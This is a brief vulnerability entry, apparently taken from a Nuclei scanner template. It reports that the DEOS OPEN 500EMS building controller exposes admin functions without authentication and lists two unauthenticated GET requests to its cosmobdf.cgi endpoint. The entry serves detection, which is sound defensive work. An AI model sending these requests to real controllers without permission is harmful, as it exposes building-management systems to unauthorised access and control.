# Vulnerability: DEOS OPEN 500EMS Controller - Admin Exposure
**Classification:** CWE-284
**Source:** Nuclei Template (`deos-open500-admin.yaml`)

## Description
The DEOS OPEN 500EMS controller exposes administrative functions without authentication.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/cgi-bin/cosmobdf.cgi?function=0
GET {{BaseURL}}/cgi-bin/cosmobdf.cgi?function=1
```

